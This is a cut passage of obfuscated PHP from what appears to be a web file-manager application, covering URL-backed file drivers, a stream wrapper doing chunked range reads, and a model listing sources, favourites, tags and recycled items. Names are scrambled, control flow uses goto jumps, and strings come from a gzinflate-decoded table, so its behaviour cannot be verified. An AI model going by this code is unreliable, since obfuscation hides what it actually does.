$B±çÏÔ¬[$e¥ï·… Ş¢[196]] : !1; } public function size($dìŸŒ÷ëêŠ) { $Dò§¦•œ¬ˆ = $this->objectMeta($dìŸŒ÷ëêŠ); return $Dò§¦•œ¬ˆ ? $Dò§¦•œ¬ˆ[$_SERVER[í™][77]] : 0; } public function info($A÷éºé²å) { if ($this->isFolder($A÷éºé²å)) { return $this->folderInfo($A÷éºé²å); } else { if ($this->isFile($A÷éºé²å)) { return $this->fileInfo($A÷éºé²å); } } return !1; } public function exist($eóË‚áƒß) { return $this->isFile($eóË‚áƒß) || $this->isFolder($eóË‚áƒß); } public function isFile($BíÀÕƒø¥) { return !$this->isFolder($BíÀÕƒø¥) && $this->objectMeta($BíÀÕƒø¥); } public function isFolder($D¡¡Í¬¡í«) { return $this->cacheMethod($_SERVER[í™][223], $D¡¡Í¬¡í«); } protected function objectMeta($BéŸÜÄèï) { return $this->cacheMethod($_SERVER[í™][224], $BéŸÜÄèï); } protected function _objectMeta($CÆ·ÉÄö‚½) { goto B¯Òèªä; BêŞè¹ÄÊÆ: if (!$D˜æÎ’¹ºé[$BõàĞ—ò²[1018]]) { return null; } $aËÓï¯Å¥  = isset($D˜æÎ’¹ºé[$BõàĞ—ò²[1020]]) ? $D˜æÎ’¹ºé[$BõàĞ—ò²[1020]] : array(); if (!isset($aËÓï¯Å¥ [$BõàĞ—ò²[1269]])) { return null; } goto f‰ªõá‘é„; B¯Òèªä: $BõàĞ—ò² =& $_SERVER[í™]; if ($CÆ·ÉÄö‚½ == $BõàĞ—ò²[33] || $CÆ·ÉÄö‚½ == $BõàĞ—ò²[8]) { return array(); } $D˜æÎ’¹ºé = $this->ussRequest($CÆ·ÉÄö‚½, $BõàĞ—ò²[1268]); goto BêŞè¹ÄÊÆ; f‰ªõá‘é„: $b›æ®ğÍë„ = array($BõàĞ—ò²[28] => get_path_this($CÆ·ÉÄö‚½), $BõàĞ—ò²[29] => isset($aËÓï¯Å¥ [$BõàĞ—ò²[1269]]) ? $aËÓï¯Å¥ [$BõàĞ—ò²[1269]] : null, $BõàĞ—ò²[77] => isset($aËÓï¯Å¥ [$BõàĞ—ò²[1270]]) ? $aËÓï¯Å¥ [$BõàĞ—ò²[1270]] : null, $BõàĞ—ò²[196] => isset($aËÓï¯Å¥ [$BõàĞ—ò²[1271]]) ? $aËÓï¯Å¥ [$BõàĞ—ò²[1271]] : null, $BõàĞ—ò²[1239] => isset($aËÓï¯Å¥ [$BõàĞ—ò²[1272]]) ? $aËÓï¯Å¥ [$BõàĞ—ò²[1272]] : null); $b›æ®ğÍë„[$BõàĞ—ò²[1240]] = isset($aËÓï¯Å¥ [$BõàĞ—ò²[1273]]) ? strtotime($aËÓï¯Å¥ [$BõàĞ—ò²[1273]]) : $b›æ®ğÍë„[$BõàĞ—ò²[1239]]; return $b›æ®ğÍë„; goto AïˆœîøˆŒ; AïˆœîøˆŒ: } protected function _isFolder($eÉ÷¡Ÿ··§) { $c©ÑĞÌò– =& $_SERVER[í™]; if ($eÉ÷¡Ÿ··§ == $c©ÑĞÌò–[33] || $eÉ÷¡Ÿ··§ == $c©ÑĞÌò–[8]) { return !0; } $A‘’ƒ‹‘Îª = $this->objectMeta($eÉ÷¡Ÿ··§); return isset($A‘’ƒ‹‘Îª[$c©ÑĞÌò–[29]]) && $A‘’ƒ‹‘Îª[$c©ÑĞÌò–[29]] == $c©ÑĞÌò–[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($DÑğ™—Şá× = false) { } public function exist($E„ÓÊŒÔÒ¹) { $BÑÉ¾ÃßŸ = $this->info($E„ÓÊŒÔÒ¹); return $BÑÉ¾ÃßŸ[$_SERVER[í™][188]]; } public function isFile($F÷öÒ¾˜Ê°) { $CÇ£ÅØóç = $this->info($F÷öÒ¾˜Ê°); return $CÇ£ÅØóç[$_SERVER[í™][188]]; } public function isFolder($e¬™àß÷íÒ) { return !1; } public function size($bŒò¥í£’) { $cŒ…¡Ô¹ê = $this->info($bŒò¥í£’); return $cŒ…¡Ô¹ê[$_SERVER[í™][77]]; } public function info($D¼Ä‰È¼Û‚) { return $this->infoParse($D¼Ä‰È¼Û‚); } public function infoAuth($FÚçÆì•§) { return $this->infoParse($FÚçÆì•§); } public function infoWithChildren($fç½ñ¦Å™) { return $this->infoParse($fç½ñ¦Å™); } public function infoFull($D¥îÖÜÃŒË) { return $this->infoParse($D¥îÖÜÃŒË); } private function infoParse($fİÌ³Üï) { $bí·´ë¥ù =& $_SERVER[í™]; $f‚ºÖˆèÇ¬ = $this->header($fİÌ³Üï); if (!$f‚ºÖˆèÇ¬ || !$f‚ºÖˆèÇ¬[$bí·´ë¥ù[671]]) { return !1; } $a©Õ´¯Å…Ì = _get($f‚ºÖˆèÇ¬, $bí·´ë¥ù[325], 0); $D¹ŠÀ¢×¿ = array($bí·´ë¥ù[28] => $f‚ºÖˆèÇ¬[$bí·´ë¥ù[28]], $bí·´ë¥ù[75] => $fİÌ³Üï, $bí·´ë¥ù[29] => $bí·´ë¥ù[167], $bí·´ë¥ù[77] => intval($a©Õ´¯Å…Ì), $bí·´ë¥ù[160] => get_path_ext($f‚ºÖˆèÇ¬[$bí·´ë¥ù[28]]), $bí·´ë¥ù[1148] => $a©Õ´¯Å…Ì > 0 && $f‚ºÖˆèÇ¬[$bí·´ë¥ù[1274]], $bí·´ë¥ù[1149] => !1); return $D¹ŠÀ¢×¿; } private function header($b¢·†›Ò‹‰) { if (isset(self::$_cacheHeader[$b¢·†›Ò‹‰])) { return self::$_cacheHeader[$b¢·†›Ò‹‰]; } self::$_cacheHeader[$b¢·†›Ò‹‰] = url_header($b¢·†›Ò‹‰); return self::$_cacheHeader[$b¢·†›Ò‹‰]; } public function hashSimple($E¿îù¤°ÂÏ, $D‹±Ğ†‚„ò = false) { goto C£ä¶‘ø¶Ü; AÔÌÕ…§÷–: $Fê¼‹Ë¶œ• = timeFloat(); $cö¬ò‡çÙÙ = 15; for ($Fö«êš¦“ = 0; $Fö«êš¦“ < $CÂÉœ…òèª; $Fö«êš¦“++) { if (timeFloat() - $Fê¼‹Ë¶œ• > $cö¬ò‡çÙÙ) { return !1; } $Eº›ÚŠÇ¬Ê = $this->fileSubstr($E¿îù¤°ÂÏ, $BÂ´²ÅÁÓõ * $Fö«êš¦“, $DÌëÇ”İ¾ï); if (!$Eº›ÚŠÇ¬Ê) { return !1; } $Eñ…öß‡ˆ .= $Eº›ÚŠÇ¬Ê; } goto EÏ›²ÄÙéŠ; BŒ¸Æ­ß¯Å: $aÅÇ¨ˆÎ×› = $Dğ…èáâ³[$eêÒ§Ê±å½[77]]; $DÌëÇ”İ¾ï = 200; $CÂÉœ…òèª = 50; goto cà“àŒİ»Å; C£ä¶‘ø¶Ü: $eêÒ§Ê±å½ =& $_SERVER[í™]; $Dğ…èáâ³ = $this->info($E¿îù¤°ÂÏ); if (!$Dğ…èáâ³ || !$Dğ…èáâ³[$eêÒ§Ê±å½[188]]) { return !1; } goto BŒ¸Æ­ß¯Å; EÏ›²ÄÙéŠ: $Eñ…öß‡ˆ .= $this->fileSubstr($E¿îù¤°ÂÏ, $aÅÇ¨ˆÎ×› - $DÌëÇ”İ¾ï, $DÌëÇ”İ¾ï); return md5($Eñ…öß‡ˆ) . $aÅÇ¨ˆÎ×›; goto Fˆ ÂÜ³®¾; cà“àŒİ»Å: if ($aÅÇ¨ˆÎ×› <= $DÌëÇ”İ¾ï * $CÂÉœ…òèª) { return md5($this->fileSubstr($E¿îù¤°ÂÏ, 0, $aÅÇ¨ˆÎ×›)) . $aÅÇ¨ˆÎ×›; } $BÂ´²ÅÁÓõ = intval($aÅÇ¨ˆÎ×› / $CÂÉœ…òèª); $Eñ…öß‡ˆ = $eêÒ§Ê±å½[33]; goto AÔÌÕ…§÷–; Fˆ ÂÜ³®¾: } public function getContent($D¡ˆßÔ·Õì) { return $this->fileSubstr($D¡ˆßÔ·Õì); } public function fileSubstr($b¿ñß¤ÒÕŸ, $eØŒÊÂ§ˆ = 0, $d‰Û¤Íêåò = -1) { goto A…õ §™ğí; aî†…Ï×Ò: if ($d‰Û¤Íêåò === -1) { $d‰Û¤Íêåò = $EêÍ‡Ş¿íÖ[$FŒÁƒ«¥ğ‚[77]]; } if ($d‰Û¤Íêåò == 0) { return $FŒÁƒ«¥ğ‚[33]; } $d“¿ÛâÚ† = array($FŒÁƒ«¥ğ‚[1275] . $eØŒÊÂ§ˆ . $FŒÁƒ«¥ğ‚[697] . ($eØŒÊÂ§ˆ + $d‰Û¤Íêåò - 1)); goto F·ÓÑº–¡ç; A…õ §™ğí: $FŒÁƒ«¥ğ‚ =& $_SERVER[í™]; $EêÍ‡Ş¿íÖ = $this->info($b¿ñß¤ÒÕŸ); if (!$EêÍ‡Ş¿íÖ || !$EêÍ‡Ş¿íÖ[$FŒÁƒ«¥ğ‚[188]] && $EêÍ‡Ş¿íÖ[$FŒÁƒ«¥ğ‚[77]] > 1024 * 1024 * 10) { return !1; } goto aî†…Ï×Ò; F·ÓÑº–¡ç: $f©êø²Ó’‹ = url_request($b¿ñß¤ÒÕŸ, $FŒÁƒ«¥ğ‚[216], !1, $d“¿ÛâÚ†, !1, !1, 1); return $f©êø²Ó’‹[$FŒÁƒ«¥ğ‚[1020]] ? $f©êø²Ó’‹[$FŒÁƒ«¥ğ‚[1020]] : $FŒÁƒ«¥ğ‚[33]; goto B²‡êÌ÷ÈØ; B²‡êÌ÷ÈØ: } public function download($BË¨ïáÙÂ¾, $bÄÂÌ•Šéç) { Downloader::start($BË¨ïáÙÂ¾, $bÄÂÌ•Šéç); return $bÄÂÌ•Šéç; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Fé‰ä«ë¥, $FßŒìµİÃø = '') { goto EÃÂ¦­¢‘´; cà£¦ÁÃé‘: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Fé‰ä«ë¥])) { self::$_chunkBuffer[$Fé‰ä«ë¥] = array(); } goto d¹ÎÔµÂö§; EÃÂ¦­¢‘´: $this->info = $this->info($Fé‰ä«ë¥); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[í™][75]]; goto cà£¦ÁÃé‘; d¹ÎÔµÂö§: return $this->info ? !0 : !1; goto CëÒÄØƒÊ; CëÒÄØƒÊ: } function stream_read($DÊÜÚ“èÈ) { $c¼¢ó¤ìãê = $this->fileSubstr($this->pose, $DÊÜÚ“èÈ); $this->pose += strlen($c¼¢ó¤ìãê); return $c¼¢ó¤ìãê; } public function stream_tell() { return $this->pose; } public function stream_seek($cÄÕ˜‰á»Ò, $dÏÅ¸´¤‚ö) { $c„Èğ—³ºô =& $_SERVER[í™]; if ($dÏÅ¸´¤‚ö == SEEK_SET) { $this->pose = $cÄÕ˜‰á»Ò; } else { if ($dÏÅ¸´¤‚ö == SEEK_CUR) { $this->pose += $cÄÕ˜‰á»Ò; } else { if ($dÏÅ¸´¤‚ö == SEEK_END) { $this->pose = $this->info[$c„Èğ—³ºô[77]] + intval($cÄÕ˜‰á»Ò); } } } if ($cÄÕ˜‰á»Ò < 0) { $this->pose = $this->info[$c„Èğ—³ºô[77]] + $cÄÕ˜‰á»Ò; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[í™][77]]; } public function stream_close() { return !0; } public function url_stat($cÈ‘ÍĞÙ¬, $A‡Ò§™ïÙô) { $B™¦ÒÂ®Ä =& $_SERVER[í™]; $eğ…æ’¡áĞ = $this->info($cÈ‘ÍĞÙ¬); return array($B™¦ÒÂ®Ä[1276] => 0, $B™¦ÒÂ®Ä[1277] => 0, $B™¦ÒÂ®Ä[12] => 32768 + 511, $B™¦ÒÂ®Ä[1278] => 0, $B™¦ÒÂ®Ä[1279] => 0, $B™¦ÒÂ®Ä[1280] => 0, $B™¦ÒÂ®Ä[1281] => 0, $B™¦ÒÂ®Ä[77] => $eğ…æ’¡áĞ[$B™¦ÒÂ®Ä[77]], $B™¦ÒÂ®Ä[1282] => $eğ…æ’¡áĞ[$B™¦ÒÂ®Ä[1154]], $B™¦ÒÂ®Ä[1240] => $eğ…æ’¡áĞ[$B™¦ÒÂ®Ä[107]], $B™¦ÒÂ®Ä[1239] => $eğ…æ’¡áĞ[$B™¦ÒÂ®Ä[187]], $B™¦ÒÂ®Ä[1283] => 0, $B™¦ÒÂ®Ä[1284] => 0); } static $fileInfo = array(); public function info($Bˆ¨ÒÎ÷Ñé) { $c»Şƒë™Ê‡ = $_SERVER[í™][1285]; if (isset(self::$fileInfo[$Bˆ¨ÒÎ÷Ñé])) { return self::$fileInfo[$Bˆ¨ÒÎ÷Ñé]; } if (substr($Bˆ¨ÒÎ÷Ñé, 0, strlen($c»Şƒë™Ê‡)) != $c»Şƒë™Ê‡) { return !1; } self::$fileInfo[$Bˆ¨ÒÎ÷Ñé] = IO::info(substr($Bˆ¨ÒÎ÷Ñé, strlen($c»Şƒë™Ê‡))); return self::$fileInfo[$Bˆ¨ÒÎ÷Ñé]; } public static function read($FãÈåº¥“æ, $DãŞÈŞÛ¦¤, $AÄ†ƒ×ŠÀ) { goto a¤Ÿ¤å·Õà; EÂÖ¡â¹âï: $dµÔäñ‡÷° = 0; while ($dµÔäñ‡÷° < $AÄ†ƒ×ŠÀ) { $aÒÙÛŒ·Û‘ = min($E¢‹²ê‡«, $AÄ†ƒ×ŠÀ - $dµÔäñ‡÷°); $D¸®Î©ï‰ .= fread($Dá­«ÔÄ«Ï, $aÒÙÛŒ·Û‘); $dµÔäñ‡÷° += $aÒÙÛŒ·Û‘; } fclose($Dá­«ÔÄ«Ï); goto Dá¹‘°ß¶š; Dá¹‘°ß¶š: return $D¸®Î©ï‰; goto BÑß¬Œ·‹”; a¤Ÿ¤å·Õà: $BªÊùÀóãê =& $_SERVER[í™]; $Dá­«ÔÄ«Ï = fopen($FãÈåº¥“æ, $BªÊùÀóãê[1156]); if (!$Dá­«ÔÄ«Ï) { return $BªÊùÀóãê[33]; } goto eŸ¶ù¿ˆãÁ; eŸ¶ù¿ˆãÁ: $E¢‹²ê‡« = 8192; fseek($Dá­«ÔÄ«Ï, $DãŞÈŞÛ¦¤, SEEK_SET); $D¸®Î©ï‰ = $BªÊùÀóãê[33]; goto EÂÖ¡â¹âï; BÑß¬Œ·‹”: } public function fileSubstr($ağö•Ÿé‹Ä, $D“Šğè„Ú¡) { goto BáÈ£–œÚä; Aµ–ªêñĞœ: foreach ($EäÊ°Á˜„Í as $F­Ÿ¦âàƒø => $bğÛš‹‚Äô) { $F­Ÿ¦âàƒø = intval($F­Ÿ¦âàƒø); $aÈ¢Æó˜Â = $F­Ÿ¦âàƒø + strlen($bğÛš‹‚Äô); if ($ağö•Ÿé‹Ä >= $aÈ¢Æó˜Â) { continue; } if ($ağö•Ÿé‹Ä >= $F­Ÿ¦âàƒø && $ağö•Ÿé‹Ä + $D“Šğè„Ú¡ <= $aÈ¢Æó˜Â) { return substr($bğÛš‹‚Äô, $ağö•Ÿé‹Ä - $F­Ÿ¦âàƒø, $D“Šğè„Ú¡); } break; } if (count($EäÊ°Á˜„Í) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($A²£ÎßáÆ[1286], $A²£ÎßáÆ[1287] . count($EäÊ°Á˜„Í) . "\x3b\163\164\x61\x72\x74\75{$ağö•Ÿé‹Ä}\54\154\x65\156\x67\x74\150\x3d{$D“Šğè„Ú¡}\73\x70\157\163\x65\x3a{$F­Ÿ¦âàƒø}\176{$aÈ¢Æó˜Â}"); throw new Exception($A²£ÎßáÆ[1288]); } $f¬˜éŠöå = intval($ağö•Ÿé‹Ä / $C‘óéâãŠ¹) * $C‘óéâãŠ¹; goto fÂïóîİ¯“; a™‰”ĞËÜá: if ($ağö•Ÿé‹Ä + $D“Šğè„Ú¡ > $AáÈªäÍáæ) { $D“Šğè„Ú¡ = $AáÈªäÍáæ - $ağö•Ÿé‹Ä; } if ($D“Šğè„Ú¡ <= 0) { return $A²£ÎßáÆ[33]; } if ($ağö•Ÿé‹Ä < 0 || $ağö•Ÿé‹Ä >= $AáÈªäÍáæ || $D“Šğè„Ú¡ <= 0 || $D“Šğè„Ú¡ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\106\151\154\145\122\x65\x61\x64\40\x65\162\162\x6f\x72\x21\x20\x73\x74\x61\x72\x74\x3d{$ağö•Ÿé‹Ä}\73\x6c\145\156\x67\x74\x68\75{$D“Šğè„Ú¡}\x3b\40\163\151\x7a\x65\x3d{$AáÈªäÍáæ}\73"); } goto b¯–ØŸìì¸; e÷»ãçè¸Ô: ksort($EäÊ°Á˜„Í); $E®šö£½Ğ” = substr($F‰ÀâÃÚòº, $ağö•Ÿé‹Ä - $f¬˜éŠöå, $D“Šğè„Ú¡); return $E®šö£½Ğ”; goto A¬Ú²õÒâ; fÂïóîİ¯“: $DÉ›ª¿…ÓÄ = ceil(($ağö•Ÿé‹Ä + $D“Šğè„Ú¡) / $C‘óéâãŠ¹) * $C‘óéâãŠ¹ - $f¬˜éŠöå; $F‰ÀâÃÚòº = IO::fileSubstr($this->path, $f¬˜éŠöå, $DÉ›ª¿…ÓÄ); $EäÊ°Á˜„Í[$f¬˜éŠöå . $A²£ÎßáÆ[33]] = $F‰ÀâÃÚòº; goto e÷»ãçè¸Ô; bÅó…İøô¨: $F­Ÿ¦âàƒø = 0; $aÈ¢Æó˜Â = 0; $bğÛš‹‚Äô = $A²£ÎßáÆ[33]; goto Aµ–ªêñĞœ; BáÈ£–œÚä: $A²£ÎßáÆ =& $_SERVER[í™]; $AáÈªäÍáæ = $this->info[$A²£ÎßáÆ[77]]; $cæšŒÄÀù¯ = $ağö•Ÿé‹Ä; goto C¯Ÿ« ‘Ò¢; C¯Ÿ« ‘Ò¢: $aš¶ãÅŒ„É = $D“Šğè„Ú¡; if ($ağö•Ÿé‹Ä < 0) { $ağö•Ÿé‹Ä = $AáÈªäÍáæ + $ağö•Ÿé‹Ä; } if ($D“Šğè„Ú¡ === !1) { $D“Šğè„Ú¡ = $AáÈªäÍáæ - $ağö•Ÿé‹Ä; } goto a™‰”ĞËÜá; b¯–ØŸìì¸: $C‘óéâãŠ¹ = 64 * 1024; $EäÊ°Á˜„Í =& self::$_chunkBuffer[$this->path]; if (!$EäÊ°Á˜„Í) { $EäÊ°Á˜„Í = array(); } goto bÅó…İøô¨; A¬Ú²õÒâ: } private function log($EÒ¯‘İºÃÛ, $CÖ¹¨óù‰Á) { $EÎÁ½â—­Î =& $_SERVER[í™]; $d¦¿ß•±–Î = timeFloat() - $this->timeStart; write_log(sprintf($EÎÁ½â—­Î[1289], $EÒ¯‘İºÃÛ, $this->info[$EÎÁ½â—­Î[28]], $d¦¿ß•±–Î, $CÖ¹¨óù‰Á), $EÎÁ½â—­Î[1205]); } } goto E¢ÛÀ· å; D•„à•…è: $e¶„­•¼õÂ = $_SERVER[í™][549]; while (strlen($e¶„­•¼õÂ) < $_SERVER[í™][550]) { if (!$e¶„­•¼õÂ) { break; } $e¶„­•¼õÂ++; } $_SERVER[æàÂÔ…ÔåÖÌ] = explode($_SERVER[í™][551], gzinflate(substr($_SERVER[í™][552], 10, -8))); goto EÎŒÜ’Ø–×; f¹öÀ…¸®”: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\x72\143\145"; protected $tableMeta = array("\164\x61\142\154\x65\116\x61\155\145" => "\x69\x6f\137\163\x6f\x75\162\143\x65\x5f\x6d\x65\164\141", "\155\145\x74\141\x46\151\x65\154\x64" => "\x73\157\x75\x72\x63\145\x49\104"); protected $dataAuto = array(array("\x6d\157\144\151\x66\x79\x54\151\155\145", "\164\151\x6d\145", "\151\156\163\145\162\x74", "\x66\165\x6e\143\x74\151\x6f\156"), array("\143\x72\145\141\x74\145\124\x69\x6d\x65", "\x74\151\x6d\x65", "\x69\x6e\163\145\162\x74", "\146\165\x6e\x63\x74\151\x6f\156"), array("\166\151\x65\167\124\151\x6d\145", "\x74\x69\x6d\x65", "\151\x6e\163\145\x72\164", "\146\x75\x6e\x63\x74\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($E¿³ñ–³À) { return $this->listSource(array($_SERVER[í™][368] => $E¿³ñ–³À)); } public function typeName($f´—‰óíƒ) { static $bº‡á–ÕÊ = array(self::TYPE_SYSTEM => "\163\171\x73\164\145\x6d", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\x67\x72\157\x75\x70"); return $bº‡á–ÕÊ[$f´—‰óíƒ . $_SERVER[í™][33]]; } public function sourceListInfo($BùÁ¿ÚÄóØ, $fê´‰´‚– = false) { goto FÇ†Ø­ùŠ—; FÇ†Ø­ùŠ—: $C†ø´Š¸Á =& $_SERVER[í™]; $BùÁ¿ÚÄóØ = $BùÁ¿ÚÄóØ ? $BùÁ¿ÚÄóØ : array(); $BùÁ¿ÚÄóØ = array_filter(array_unique($BùÁ¿ÚÄóØ)); goto AÁ—õ¸ç¼; a¯¹““İÈ¸: return array_to_keyvalue($B‰¬ùÊÅÃ, $C†ø´Š¸Á[369]); goto AËÎƒÙï‰; AÁ—õ¸ç¼: if (!$BùÁ¿ÚÄóØ) { return array(); } $B‰¬ùÊÅÃ = $this->where(array($C†ø´Š¸Á[369] => array($C†ø´Š¸Á[7], $BùÁ¿ÚÄóØ)))->select(); $this->_listDataApply($B‰¬ùÊÅÃ, $fê´‰´‚–); goto a¯¹““İÈ¸; AËÎƒÙï‰: } public function pathInfoFilter($fäß²íùº) { goto f™“Õ«ë; CÊ¹½Õ‚‡: $BËò’’ßáñ .= $FŸŠ²ƒŠ¼Ò[374]; $BËò’’ßáñ .= $FŸŠ²ƒŠ¼Ò[375]; $C¨ö•Èù³í = explode($FŸŠ²ƒŠ¼Ò[47], $BËò’’ßáñ); goto dªØÙôŠœ; f™“Õ«ë: $FŸŠ²ƒŠ¼Ò =& $_SERVER[í™]; $fäß²íùº[$FŸŠ²ƒŠ¼Ò[75]] = KodIO::make($fäß²íùº[$FŸŠ²ƒŠ¼Ò[369]]); $fäß²íùº[$FŸŠ²ƒŠ¼Ò[29]] = $fäß²íùº[$FŸŠ²ƒŠ¼Ò[370]] == 1 ? $FŸŠ²ƒŠ¼Ò[76] : $FŸŠ²ƒŠ¼Ò[167]; goto EùƒÎµ‚•‚; EùƒÎµ‚•‚: $fäß²íùº[$FŸŠ²ƒŠ¼Ò[371]] = $this->typeName($fäß²íùº[$FŸŠ²ƒŠ¼Ò[371]]); if ($fäß²íùº[$FŸŠ²ƒŠ¼Ò[370]] != 1) { $fäß²íùº[$FŸŠ²ƒŠ¼Ò[160]] = $fäß²íùº[$FŸŠ²ƒŠ¼Ò[372]]; unset($fäß²íùº[$FŸŠ²ƒŠ¼Ò[372]]); } $BËò’’ßáñ = $FŸŠ²ƒŠ¼Ò[373]; goto CÊ¹½Õ‚‡; dªØÙôŠœ: if (isset($fäß²íùº[$FŸŠ²ƒŠ¼Ò[376]]) && $fäß²íùº[$FŸŠ²ƒŠ¼Ò[376]][$FŸŠ²ƒŠ¼Ò[377]] == -1) { $C¨ö•Èù³í = array_remove_value($C¨ö•Èù³í, $FŸŠ²ƒŠ¼Ò[187]); $C¨ö•Èù³í = array_remove_value($C¨ö•Èù³í, $FŸŠ²ƒŠ¼Ò[107]); $C¨ö•Èù³í = array_remove_value($C¨ö•Èù³í, $FŸŠ²ƒŠ¼Ò[378]); $C¨ö•Èù³í = array_remove_value($C¨ö•Èù³í, $FŸŠ²ƒŠ¼Ò[379]); $C¨ö•Èù³í = array_remove_value($C¨ö•Èù³í, $FŸŠ²ƒŠ¼Ò[77]); $C¨ö•Èù³í = array_remove_value($C¨ö•Èù³í, $FŸŠ²ƒŠ¼Ò[380]); } $fäß²íùº = array_field_key($fäß²íùº, $C¨ö•Èù³í); return $fäß²íùº; goto aåöçÁôÙ; aåöçÁôÙ: } public function listUserFav() { goto fø½³†Í£ª; fø½³†Í£ª: $f˜·ä³µªó =& $_SERVER[í™]; $Bë¸˜áˆÎ = Model($f˜·ä³µªó[381])->listData(); $cÉƒÄŠò– = array_filter_by_field($Bë¸˜áˆÎ, $f˜·ä³µªó[29], $f˜·ä³µªó[382]); goto A¿ÎÕ“ã; CÆ¼ë´‹¯: foreach ($Bë¸˜áˆÎ as &$f™…Â¿¶“‹) { $f™…Â¿¶“‹ = array($f˜·ä³µªó[385] => $f™…Â¿¶“‹[$f˜·ä³µªó[367]], $f˜·ä³µªó[386] => $f™…Â¿¶“‹[$f˜·ä³µªó[28]], $f˜·ä³µªó[387] => $f™…Â¿¶“‹[$f˜·ä³µªó[75]], $f˜·ä³µªó[388] => $f™…Â¿¶“‹[$f˜·ä³µªó[29]], $f˜·ä³µªó[389] => $f™…Â¿¶“‹[$f˜·ä³µªó[187]], $f˜·ä³µªó[390] => $f™…Â¿¶“‹[$f˜·ä³µªó[107]]); if ($f™…Â¿¶“‹[$f˜·ä³µªó[29]] == $f˜·ä³µªó[382] && $C˜Æ²‚Şù[$f™…Â¿¶“‹[$f˜·ä³µªó[75]]]) { $f™…Â¿¶“‹[$f˜·ä³µªó[391]] = $C˜Æ²‚Şù[$f™…Â¿¶“‹[$f˜·ä³µªó[75]]]; } } return $Bë¸˜áˆÎ; goto bĞ´ê¬ƒâ; A¿ÎÕ“ã: $cÉƒÄŠò– = array_to_keyvalue($cÉƒÄŠò–, $f˜·ä³µªó[33], $f˜·ä³µªó[75]); if ($cÉƒÄŠò–) { $C˜Æ²‚Şù = $this->listSource(array($f˜·ä³µªó[383] => array($f˜·ä³µªó[384], $cÉƒÄŠò–))); } $C˜Æ²‚Şù = array_to_keyvalue($C˜Æ²‚Şù[$f˜·ä³µªó[354]], $f˜·ä³µªó[369]); goto CÆ¼ë´‹¯; bĞ´ê¬ƒâ: } public function listUserTag($fãÇÜ¾×Ü…) { goto aÑîªÊÉØ; AˆÙ–ÓÑª: foreach ($E¥Î©ëìâî as $c¸”ãœ–Œ¹ => $bò‹ÔËËÙ£) { $aœª¨±¦ª» = !0; if (!$fãÇÜ¾×Ü…) { $Fñë‘ƒÛÙ[] = $c¸”ãœ–Œ¹; continue; } foreach ($fãÇÜ¾×Ü… as $A‡Üì™Õ—Ü) { if (!in_array($A‡Üì™Õ—Ü, $bò‹ÔËËÙ£)) { $aœª¨±¦ª» = !1; break; } } if ($aœª¨±¦ª») { $Fñë‘ƒÛÙ[] = $c¸”ãœ–Œ¹; } } if (!$Fñë‘ƒÛÙ) { return array(); } $aÄá¯Êí‚ = $this->listSource(array($aêÂºåÀÉß[383] => array($aêÂºåÀÉß[384], $Fñë‘ƒÛÙ))); goto fŠ¨‰œù„ò; BŸĞÏ¢Š½¢: if ($Bì¢’Ä“©) { Model($aêÂºåÀÉß[394])->removeBySource($Bì¢’Ä“©); } return $aÄá¯Êí‚; goto dë·ŸñäÏ; aÑîªÊÉØ: $aêÂºåÀÉß =& $_SERVER[í™]; if ($fãÇÜ¾×Ü… && !is_array($fãÇÜ¾×Ü…)) { $fãÇÜ¾×Ü… = array($fãÇÜ¾×Ü…); } $c‡¤ÌŒŠ±Ê = Model($aêÂºåÀÉß[392])->listData(); goto d‡õ×Ú‚ê“; fŠ¨‰œù„ò: if (!$aÄá¯Êí‚ || count($Fñë‘ƒÛÙ) == $aÄá¯Êí‚[$aêÂºåÀÉß[351]][$aêÂºåÀÉß[352]]) { return $aÄá¯Êí‚; } $Bì¢’Ä“© = array(); $f÷Í½“ÉÕÀ = array_to_keyvalue($aÄá¯Êí‚[$aêÂºåÀÉß[74]], $aêÂºåÀÉß[33], $aêÂºåÀÉß[369]); goto DÕò†åÌ¾; DÕò†åÌ¾: $aÊõ·ˆ™ĞÀ = array_to_keyvalue($aÄá¯Êí‚[$aêÂºåÀÉß[73]], $aêÂºåÀÉß[33], $aêÂºåÀÉß[369]); $d—´ÛÄà = array_merge($aÊõ·ˆ™ĞÀ, $f÷Í½“ÉÕÀ); foreach ($Fñë‘ƒÛÙ as $e·øŠ¸˜ßó) { if (!in_array($e·øŠ¸˜ßó, $d—´ÛÄà)) { $Bì¢’Ä“©[] = $e·øŠ¸˜ßó; } } goto BŸĞÏ¢Š½¢; d‡õ×Ú‚ê“: $E¥Î©ëìâî = array(); foreach ($c‡¤ÌŒŠ±Ê as $fÆ´Ê–ĞÁ”) { $e·øŠ¸˜ßó = $fÆ´Ê–ĞÁ”[$aêÂºåÀÉß[75]]; if (!$e·øŠ¸˜ßó) { continue; } if (!isset($E¥Î©ëìâî[$e·øŠ¸˜ßó])) { $E¥Î©ëìâî[$e·øŠ¸˜ßó] = array(); } $E¥Î©ëìâî[$e·øŠ¸˜ßó][] = $fÆ´Ê–ĞÁ”[$aêÂºåÀÉß[393]]; } $Fñë‘ƒÛÙ = array(); goto AˆÙ–ÓÑª; dë·ŸñäÏ: } public function listUserRecycle() { $CÌÙ ‰Í±ì =& $_SERVER[í™]; $CñÛ’†›Æì = Model($CÌÙ ‰Í±ì[395])->listData(); if (!$CñÛ’†›Æì) { return array(); } $Dë‰é¯õÖô = array($CÌÙ ‰Í±ì[383] => array($CÌÙ ‰Í±ì[384], $CñÛ’†›Æì), $CÌÙ ‰Í±ì[396] => 1); return $this->listSource($Dë‰é¯õÖô); } public function listSource($EåùíäÍÂ, $dÖÊ…ˆ¦øÅ = 3000) { goto B‘ï“¹­›à; d‡‚ÄÕßÙ: return $c‡‚”àËÃ×; goto 